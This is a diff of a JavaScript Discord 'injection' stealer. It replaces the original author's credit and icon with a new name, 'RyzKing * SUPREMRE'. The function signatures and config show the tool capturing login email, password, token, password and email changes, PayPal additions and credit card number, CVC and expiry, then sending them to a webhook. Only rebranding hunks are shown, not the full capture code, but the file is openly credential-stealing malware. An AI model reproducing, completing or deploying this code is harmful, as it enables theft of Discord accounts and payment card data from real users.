@@ -10,7 +10,7 @@ const config = {
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: "Discord Injection", //name of the webhook thats gonna send the info
   embed_icon:
-    "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(
+    "https://media.discordapp.net/attachments/964221220629409852/965789203826901002/unknown.png?width=427&height=427".replace(
       / /g,
       "%20",
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
@@ -356,7 +356,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection By RyzKing * SUPREMRE",
         },
       },
     ],
@@ -398,7 +398,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection By RyzKing * SUPREMRE",
         },
       },
     ],
@@ -440,7 +440,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection By RyzKing * SUPREMRE",
         },
       },
     ],
@@ -482,7 +482,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection By RyzKing * SUPREMRE",
         },
       },
     ],
@@ -524,7 +524,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection By RyzKing * SUPREMRE",
         },
       },
     ],
@@ -568,7 +568,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection By RyzKing * SUPREMRE",
         },
       },
     ],
